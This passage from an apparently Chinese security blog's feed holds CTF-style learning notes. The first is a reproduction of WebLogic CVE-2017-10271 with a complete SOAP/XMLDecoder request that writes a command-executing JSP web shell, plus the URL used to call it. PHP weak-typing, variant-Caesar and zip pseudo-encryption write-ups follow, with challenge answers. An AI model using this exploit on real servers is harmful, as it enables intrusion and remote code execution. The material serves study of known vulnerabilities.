data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbykv6pj9qj30v208qdgg.jpg" class="lazyload"></a></p><p>ç„¶åå†™å…¥ <code>payload</code></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang"></div></div><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/wls-wsat/CoordinatorPortType</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: your-ip:7001</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,en-US;q=0.7,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Content-Type</span>: text/xml</span><br><span class="line"><span class="attribute">Content-Length</span>: 929</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt;</span><br><span class="line">    &lt;soapenv:Header&gt;</span><br><span class="line">    &lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;</span><br><span class="line">    &lt;java&gt;&lt;java version="1.4.0" class="java.beans.XMLDecoder"&gt;</span><br><span class="line">    &lt;object class="java.io.PrintWriter"&gt; </span><br><span class="line">    &lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp&lt;/string&gt;&lt;void method="println"&gt;&lt;string&gt;&lt;![CDATA[</span><br><span class="line"></span><br><span class="line"> &lt;%</span><br><span class="line">    if("yakko".equals(request.getParameter("pwd")))&#123;</span><br><span class="line">        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();</span><br><span class="line">        int a = -1;</span><br><span class="line">        byte[] b = new byte[2048];</span><br><span class="line">        out.print("&lt;pre&gt;");</span><br><span class="line">        while((a=in.read(b))!=-1)&#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print("&lt;/pre&gt;");</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;]]&gt;&lt;/string&gt;&lt;/void&gt;&lt;void method="close"/&gt;&lt;/object&gt;&lt;/java&gt;&lt;/java&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure></div><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbykv6t3vgj312c0ian1t.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbykv6t3vgj312c0ian1t.jpg" class="lazyload"></a></p><h2 id="è®¿é—®-shell"><a href="#è®¿é—®-shell" class="headerlink" title="è®¿é—® shell"></a>è®¿é—® shell</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;your-ip:7001&#x2F;bea_wls_internal&#x2F;test.jsp?pwd&#x3D;yakko&amp;i&#x3D;ls</span><br></pre></td></tr></table></figure></div><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbykv6pqkzj30kp07rmxd.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbykv6pqkzj30kp07rmxd.jpg" class="lazyload"></a></p><hr><h1 id="æ‰¯ä¸€ä¸‹"><a href="#æ‰¯ä¸€ä¸‹" class="headerlink" title="æ‰¯ä¸€ä¸‹"></a>æ‰¯ä¸€ä¸‹</h1><p>ä¸çŸ¥ä¸è§‰å¼€å­¦äº†ï¼Œæœ¬æ¥è¿˜è¯´è¦å¤šAå‡ é“é¢˜ï¼Œå¤šçœ‹äº›ä¹¦ï¼Œç»“æœ50æ¥å¤©çš„å¯’å‡å°±ç»“æŸäº†ï¼Œæ·¦ï¼Œå•¥éƒ½æ²¡çœ‹ï¼Œæ‘¸é±¼æ‘¸ç€æ‘¸ç€å°±è¦æ¯•ä¸šäº†ï¼Œä¹Ÿæ›¾æ¢¦æƒ³ä»—å‰‘èµ°å¤©æ¶¯ï¼Œç»“æœå‘ç°è‡ªå·±ä»€ä¹ˆæœ¬é¢†éƒ½æ²¡æœ‰ï¼Œåªèƒ½æœ›ç€è¿œæ–¹çš„æ¸è¡Œæ¸è¿œçš„èº«å½±ï¼Œè¿·èŒ«ç€ä¸çŸ¥é“è‡ªå·±è¯¥ä½•å»ä½•ä»ã€‚</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbykv6plqrj30g40f5767.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbykv6plqrj30g40f5767.jpg" class="lazyload"></a></p><p>å‚è€ƒé“¾æ¥å¦‚ä¸‹<br><a href="https://www.cnblogs.com/xyongsec/archive/2019/07/03/11125511.html" target="_blank" rel="noopener">Weblogic(CVE-2017-10271)æ¼æ´å¤ç°</a><br><a href="https://paper.seebug.org/487/" target="_blank" rel="noopener">Weblogic XMLDecoder RCEåˆ†æ</a><br><a href="https://blog.51cto.com/duallay/1961598" target="_blank" rel="noopener">XMLDecoderååºåˆ—åŒ–æ¼æ´</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Weblogicæ˜¯oracleæ¨å‡ºçš„application serverï¼Œç”±äºå…¶å…·æœ‰æ”¯æŒEJBã€JSPã€JMSã€XMLç­‰å¤šç§è¯­è¨€ã€å¯æ‰©å±•æ€§ã€å¿«é€Ÿå¼€å‘ç­‰å¤šç§ç‰¹æ€§ï¼Œå¤‡å—å¹¿å¤§ç³»ç»Ÿç®¡ç†å‘˜çš„é’çã€‚æ ¹æ®ä¸å®Œå…¨ç»Ÿè®¡weblogicçº¦å å…¨çƒå¸‚åœºä»½é¢1/3ï¼Œæ­£å› ä¸ºè¿™ä¹ˆé«˜çš„å æœ‰ç‡ï¼Œä¹Ÿé€ æˆæ¯æ¬¡weblogicæœ‰æ–°çš„æ¼æ´ï¼Œéƒ½ä¼šåœ¨ä¸šå†…å¼•èµ·è½©ç„¶å¤§æ³¢ã€‚åœ¨2017å¹´æ¥è¿‘å°¾å£°æ—¶ï¼Œweblogicåˆå†æ¬¡ç»™å¤§å®¶å¸¦æ¥äº†å·¨å¤§æƒŠå–œï¼ŒCVE-2017-10271æ¼æ´åˆä¸€æ¬¡å¸­å·äº†æ”¿åºœã€é“¶è¡Œç­‰å„å¤§è¡Œä¸šã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="å­¦ä¹ ç¬”è®°" scheme="https://manayakko.github.io/yakko117/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="æ¸—é€" scheme="https://manayakko.github.io/yakko117/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>ä»ä¸€é“é¢˜å­¦ä¹ phpçš„å°ç‰¹æ€§</title>
    <link href="https://manayakko.github.io/yakko117/2020/02/12/php%E5%B0%8F%E7%89%B9%E6%80%A7/"/>
    <id>https://manayakko.github.io/yakko117/2020/02/12/php%E5%B0%8F%E7%89%B9%E6%80%A7/</id>
    <published>2020-02-12T12:23:08.085Z</published>
    <updated>2020-02-12T13:26:30.124Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>Pç¥ï¼Œæ°¸è¿œæ»´ç¥~ (æŠ–ä¸ªæœºçµï¼‰<br>æ‰‹ä¸Šè¿˜æ”’ç€å‡ ä¸ªé—®é¢˜ï¼Œä¸€ç›´æ²¡æ€ä¹ˆèŠ±æ—¶é—´å»å­¦ä¹ ï¼Œè¦æŠ“ç´§æ—¶é—´äº†</p><a id="more"></a><h1 id="å®‰æ’-å¥‡æ€ªçš„æé¾™ç‰¹æ€§"><a href="#å®‰æ’-å¥‡æ€ªçš„æé¾™ç‰¹æ€§" class="headerlink" title="[å®‰æ’] å¥‡æ€ªçš„æé¾™ç‰¹æ€§"></a>[å®‰æ’] å¥‡æ€ªçš„æé¾™ç‰¹æ€§</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">ini_set(<span class="string">"display_error"</span>, <span class="keyword">false</span>);  </span><br><span class="line">error_reporting(<span class="number">0</span>);  </span><br><span class="line">$str = <span class="keyword">isset</span>($_GET[<span class="string">'A_A'</span>])?$_GET[<span class="string">'A_A'</span>]:<span class="string">'A_A'</span>; </span><br><span class="line"><span class="keyword">if</span> (strpos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">"A_A"</span>) !==<span class="keyword">false</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,have fun'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">elseif</span> ($str&lt;<span class="number">9999999999</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,too small'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">elseif</span> ((string)$str&gt;<span class="number">0</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,too big'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">'flag.php'</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><h1 id="é¦–å…ˆå…ˆçœ‹ä¸€ä¸‹pç¥çš„è¯´æ³•"><a href="#é¦–å…ˆå…ˆçœ‹ä¸€ä¸‹pç¥çš„è¯´æ³•" class="headerlink" title="é¦–å…ˆå…ˆçœ‹ä¸€ä¸‹pç¥çš„è¯´æ³•"></a>é¦–å…ˆå…ˆçœ‹ä¸€ä¸‹pç¥çš„è¯´æ³•</h1><pre><code>æˆ‘ä¸€ç›´åœ¨æ€è€ƒï¼Œå‡è®¾æˆ‘æœ‰ä¸€ä¸ªåŠæ³•ï¼Œåœ¨ç¬¬ä¸€æ¬¡WAFæ£€æµ‹å‚æ•°çš„æ—¶å€™ï¼Œæ£€æµ‹çš„æ˜¯22222ï¼Œä½†åé¢è¦†ç›–requestçš„æ—¶å€™ï¼Œæ‹¿åˆ°çš„æ˜¯11111ï¼Œé‚£ä¹ˆä¸å°±å¯ä»¥é€ æˆWAFçš„ç»•è¿‡äº†ä¹ˆï¼Ÿä½†ä¸Šè¿°ä¸¤ä¸ªå®éªŒçš„ç»“æœè¡¨ç¤ºï¼Œæˆ‘è¿™ä¸ªå‡è®¾æ˜¯ä¸æˆç«‹çš„ã€‚äºŒè€…è·å–çš„ç»“æœéƒ½æ˜¯22222 ã€‚é‚£ä¹ˆï¼Œè¿™ä¸ªæ€è·¯æ˜¯å¦å°±æ˜¯ä¸å¯è¡Œçš„äº†ï¼Ÿ</code></pre><p><code>php</code> è‡ªèº«åœ¨è§£æè¯·æ±‚çš„æ—¶å€™ï¼Œå¦‚æœå‚æ•°åå­—ä¸­åŒ…å« <code>&quot; &quot;</code>ã€<code>&quot;.&quot;</code>ã€<code>&quot;[&quot;</code> è¿™å‡ ä¸ªå­—ç¬¦ï¼Œä¼šå°†ä»–ä»¬è½¬æ¢æˆ <code>_</code> ã€‚<br>é‚£ä¹ˆå‡è®¾æˆ‘å‘é€çš„æ˜¯è¿™æ ·ä¸€ä¸ªè¯·æ±‚ï¼š <code>/t.php?user_id=11111&amp;user.id=22222</code> <code>php</code> å…ˆå°† <code>user.id</code> è½¬æ¢æˆ <code>user_id</code> å³ä¸º <code>/t.php?user_id=11111&amp;user_id=22222</code> å†è·å–åˆ°çš„<code>$_REQUEST[&#39;user_id&#39;]</code>å°±æ˜¯22222ã€‚<br>å¯åœ¨ <code>$_SERVER[&#39;REQUEST_URI&#39;]</code> ä¸­ <code>user_id</code> å’Œ<code>user.id</code>å´æ˜¯ä¸¤ä¸ªå®Œå…¨ä¸åŒçš„å‚æ•°åï¼Œåˆ‡å‰²è¦†ç›–åï¼Œè·å–çš„ <code>$_REQUEST[&#39;user_id&#39;]</code> å´æ˜¯ <code>11111</code>ã€‚</p><p>ç„¶åå†çœ‹é¢˜ç›®</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> ($str&lt;<span class="number">9999999999</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,too small'</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>åˆ©ç”¨æ•°å­—ç»•è¿‡ï¼šæ•°ç»„æ°¸è¿œæ¯”æ•°å­—å¤§ï¼Œæ°¸è¿œæ¯”æ•°å­—å¤§</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# php -r "@var_dump(admin==0);"</span><br><span class="line">bool(true)</span><br><span class="line">root@kali:~# php -r "var_dump([]&gt;999999999999999999999);"</span><br><span class="line">bool(true)</span><br></pre></td></tr></table></figure></div><p>ç¬¬äºŒä¸ªåˆ¤æ–­æ˜¯å¼ºåˆ¶è½¬åŒ–ä¸ºå­—ç¬¦ä¸²å†ä¸æ•°å­—æ¯”è¾ƒçš„åˆ¤æ–­</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> ((string)$str&gt;<span class="number">0</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'A_A,too big'</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>ç®€å•çš„å¼±ç±»å‹ç»•è¿‡äº†ï¼Œè®©å‚æ•°ç­‰äºæŸä¸ªå­—ç¬¦ä¸²ï¼Œä¾‹å¦‚ï¼š<code>admin</code> å°±å¯ä»¥äº†ï¼Œå› ä¸º<code>admin== 0</code>ï¼Œç»“æœæ˜¯<code>true</code>ï¼Œç›´æ¥ç­‰äº0ç»•è¿‡ï¼Œæœ€åçš„Payload:</p><p><code>?A+A[]=admin</code>w</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Pç¥ï¼Œæ°¸è¿œæ»´ç¥~ (æŠ–ä¸ªæœºçµï¼‰&lt;br&gt;æ‰‹ä¸Šè¿˜æ”’ç€å‡ ä¸ªé—®é¢˜ï¼Œä¸€ç›´æ²¡æ€ä¹ˆèŠ±æ—¶é—´å»å­¦ä¹ ï¼Œè¦æŠ“ç´§æ—¶é—´äº†&lt;/p&gt;
    
    </summary>
    
    
      <category term="å­¦ä¹ ç¬”è®°" scheme="https://manayakko.github.io/yakko117/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="php" scheme="https://manayakko.github.io/yakko117/tags/php/"/>
    
      <category term="ctf" scheme="https://manayakko.github.io/yakko117/tags/ctf/"/>
    
      <category term="code audit" scheme="https://manayakko.github.io/yakko117/tags/code-audit/"/>
    
  </entry>
  
  <entry>
    <title>CTFå¯†ç å­¦å…¥é—¨å­¦ä¹ (ä¸€)</title>
    <link href="https://manayakko.github.io/yakko117/2020/02/11/ctf%E5%AF%86%E7%A0%81%E5%AD%A61/"/>
    <id>https://manayakko.github.io/yakko117/2020/02/11/ctf%E5%AF%86%E7%A0%81%E5%AD%A61/</id>
    <published>2020-02-11T04:18:47.544Z</published>
    <updated>2020-02-11T13:15:58.195Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="å˜å¼‚å‡¯æ’’"><a href="#å˜å¼‚å‡¯æ’’" class="headerlink" title="å˜å¼‚å‡¯æ’’"></a>å˜å¼‚å‡¯æ’’</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">åŠ å¯†å¯†æ–‡ï¼šafZ_r9VYfScOeO_UL^RWUc</span><br><span class="line">æ ¼å¼ï¼šflag&#123; &#125;</span><br></pre></td></tr></table></figure></div><p>æ—¢ç„¶è¯´æ˜¯å‡¯æ’’å¯†ç ï¼Œå…ˆå°è¯•å¸¸è§„è§£ç ï¼Œä½†å‘ç°æ²¡æœ‰ä¸€ä¸ªæ­£å¸¸çš„è§£ç <br>å› æ­¤è€ƒè™‘è¯»Asciiç </p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbsc91ihu2j30r00hlk3r.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbsc91ihu2j30r00hlk3r.jpg" class="lazyload"></a></p><p>é¢˜ç›®å·²ç»æç¤ºå¯†æ–‡æ ¼å¼ä¸º: <code>flag{</code><br>æˆ‘ä»¬å¯¹ç…§ç›¸åº”çš„Asciiç </p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">f-&gt;</span><span class="bash">102ï¼›l-&gt;108ï¼›a-&gt;97ï¼›g-&gt;103ï¼›&#123;-&gt;123</span></span><br><span class="line"></span><br><span class="line"><span class="meta">a-&gt;</span><span class="bash">97ï¼›f-&gt;102ï¼›Z-&gt;90ï¼›_-&gt;95ï¼›r-&gt;114</span></span><br></pre></td></tr></table></figure></div><p>å¯ä»¥çœ‹åˆ°ç¬¬ä¸€ä¸ªç›¸å·®5ï¼Œç¬¬äºŒä¸ªç›¸å·®6ï¼Œä»¥æ­¤ç±»æ¨</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbsc91gg66j307806ot8m.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbsc91gg66j307806ot8m.jpg" class="lazyload"></a></p><p>æœ€åæ„é€ å¦‚ä¸‹è„šæœ¬ï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> a[] = <span class="string">"afZ_r9VYfScOeO_UL^RWUc"</span>;</span><br><span class="line"><span class="keyword">int</span> CS = <span class="built_in">strlen</span>(a), t; <span class="comment">// è®¡ç®—å­—ç¬¦ä¸²é•¿åº¦ </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; CS; i++)</span><br><span class="line">&#123;</span><br><span class="line">t = a[i];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, t + i+<span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><hr><p>ç„¶ååæ¥ä¹Ÿçœ‹åˆ°æœ‰å¸ˆå‚…æœ‰å…¶ä»–è„šæœ¬</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b_kaisa</span><span class="params">(mstr)</span>:</span></span><br><span class="line">    j = <span class="number">5</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    lmstr = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(mstr)):</span><br><span class="line">        m = ord(mstr[i])          <span class="comment"># å°†å¯†æ–‡çš„ç¬¬iä¸ªå­—æ¯å˜ä¸ºå…¶asciiç å€¼</span></span><br><span class="line">        m = m + j                 <span class="comment"># asciiå€¼+j</span></span><br><span class="line">        lmstr.append(m)           <span class="comment"># å°†é€’è¿›åçš„asciiå€¼å­˜å…¥åˆ—è¡¨lmstr[]</span></span><br><span class="line">        i = i+<span class="number">1</span></span><br><span class="line">        j = j+<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> lmstr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    m_str = <span class="string">'afZ_r9VYfScOeO_UL^RWUc'</span>    <span class="comment"># å¯†æ–‡</span></span><br><span class="line">    lstr = []</span><br><span class="line">    lstr = b_kaisa(m_str)</span><br><span class="line">    <span class="keyword">print</span> lstr</span><br></pre></td></tr></table></figure></div><p>è·‘å‡ºæ¥ç»“æœä¸º</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[102, 108, 97, 103, 123, 67, 97, 101, 115, 97, 114, 95, 118, 97, 114, 105, 97, 116, 105, 111, 110, 125]</span><br></pre></td></tr></table></figure></div><p>æ”¾åˆ° <code>Asciiè§£ç å™¨</code>ï¼Œå¾—åˆ°çš„ç­”æ¡ˆä¸€æ ·</p><hr><h1 id="zipä¼ªåŠ å¯†"><a href="#zipä¼ªåŠ å¯†" class="headerlink" title="zipä¼ªåŠ å¯†"></a>zipä¼ªåŠ å¯†</h1><p>å‚è€ƒæ–‡çŒ®å¦‚ä¸‹ï¼š<br><a href="https://blog.csdn.net/wclxyn/article/details/7288994" target="_blank" rel="noopener">ä¸€ä¸ªzipæ–‡ä»¶ç”±è¿™æ ·ä¸‰ä¸ªéƒ¨åˆ†ç»„æˆ</a><br><a href="https://blog.csdn.net/qq_26187985/article/details/83654197" target="_blank" rel="noopener">zipä¼ªåŠ å¯†åŸç†åŠæ“ä½œ</a></p><p>é€šè¿‡winhex æ‰“å¼€æ–‡ä»¶</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbsc91frovj30me084aam.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbsc91frovj30me084aam.jpg" class="lazyload"></a></p><p>å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒºï¼š<br><code>50 4B 01 02</code>ï¼šç›®å½•ä¸­æ–‡ä»¶æ–‡ä»¶å¤´æ ‡è®°</p><p><code>00 00</code>ï¼šå‹ç¼©ä½¿ç”¨çš„ç‰ˆæœ¬<br><code>14 00</code>ï¼šè§£å‹æ–‡ä»¶æ‰€éœ€ pkware ç‰ˆæœ¬<br><code>00 00</code>ï¼šå…¨å±€æ–¹å¼ä½æ ‡è®°ï¼ˆæœ‰æ— åŠ å¯†ï¼Œè¿™ä¸ªæ›´æ”¹è¿™é‡Œè¿›è¡Œä¼ªåŠ å¯†ï¼Œæ”¹ä¸º <code>09 00</code> æ‰“å¼€å°±ä¼šæç¤ºæœ‰å¯†ç äº†ï¼‰</p><p>å‹ç¼©æºæ–‡ä»¶ç›®å½•ç»“æŸæ ‡å¿— ï¼š<code>50 4B 05 06</code></p><p>é¦–å…ˆå…ˆæŸ¥æ‰¾ <code>504B</code>ï¼Œç‚¹å‡»ç¬¬äºŒä¸ª<code>504B</code>ï¼ˆå‹ç¼©æºæ–‡ä»¶ç›®å½•åŒºï¼‰</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbsc91hcdrj30i006ojrs.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbsc91hcdrj30i006ojrs.jpg" class="lazyload"></a></p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbsc91gseyj30oj0cagmm.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbsc91gseyj30oj0cagmm.jpg" class="lazyload"></a></p><p>ä¿®æ”¹åå°±å¯ä»¥å¾—åˆ°flagäº†ï¼ˆä¸Šé¢è¿˜æœ‰ä¸€ä¸ª <code>09 00</code> ä¹Ÿè¦æ”¹ï¼‰</p><hr><h1 id="basic-RSA"><a href="#basic-RSA" class="headerlink" title="basic_RSA"></a>basic_RSA</h1><p><a href="http://buuoj.cn/files/b37f7f440149a3ac517deed5849bc529/70a2f2f0-d422-4cda-a92b-3c48eb9a0fbd.zip" target="_blank" rel="noopener">é¢˜ç›®é“¾æ¥</a></p><p>é¢˜ç›®å†…å®¹:</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight 